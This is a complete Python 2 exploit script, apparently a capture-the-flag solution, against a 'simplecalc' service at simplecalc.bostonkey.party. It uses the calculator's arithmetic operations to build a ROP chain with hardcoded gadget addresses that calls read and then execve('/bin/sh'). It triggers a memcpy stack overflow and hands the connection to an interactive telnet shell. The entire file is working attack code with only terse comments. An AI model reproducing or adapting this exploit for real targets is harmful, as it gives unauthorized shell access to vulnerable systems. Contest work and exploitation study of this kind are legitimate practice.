from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

def add(val1, val2):
    s.send("1\n")
    s.send(str(val1) + "\n")
    s.send(str(val2) + "\n")

def sub(val1, val2):
    s.send("2\n")
    s.send(str(val1) + "\n")
    s.send(str(val2) + "\n")

def div(val1, val2):
    s.send("4\n")
    s.send(str(val1) + "\n")
    s.send(str(val2) + "\n")

def set_val(val):
    sub(31337 + val, 31337)
    sub(31337, 31337)

def set_addr(addr):
    add(addr/2, (addr/2)+(addr%2))
    sub(31337, 31337)    

def read(fd, buf, buf_len):
    set_addr(pop_rdi)
    set_val(fd)
    set_addr(pop_rsi)
    set_addr(buf)
    set_addr(pop_rdx)
    set_val(buf_len)
    set_addr(read_addr)

def execve(filename, argv):
    set_addr(pop_rdi)
    set_addr(filename)
    set_addr(pop_rsi)
    set_addr(argv)
    set_addr(pop_rdx)
    set_val(0)
    set_addr(pop_rax)
    set_val(59)
    set_addr(syscall)

cmd = "/bin/sh\x00"
bss = 0x6c2c40
pop_rdi = 0x401b73
pop_rsi = 0x460ce1
pop_rdx = 0x4560b4
pop_rax = 0x44db34
syscall = 0x4648e5
read_addr = 0x434b20
argv_ptr = bss + len(cmd)

#host = 'localhost'
host = 'simplecalc.bostonkey.party'
port = 5400

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

#recv_until(s, "Expected number of calculations: ")
s.send("100\n")

# Set dummy null / free(NULL) does not occur any error in this prob
for i in range(9):
    set_val(0)

# STAGE 1: read execve command to BSS
read(0, bss, len(cmd))
read(0, argv_ptr, 8)

# STAGE 2: call execve syscall
execve(bss, argv_ptr)

# Trigger (memcpy stack overflow)
s.send("5\n")

# send command ("/bin/sh\x00")
time.sleep(1)
s.send(cmd)

# send argv ptr addr
time.sleep(1)
s.send(pack("<Q", argv_ptr))

print "[+] You got a shell!"
try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass
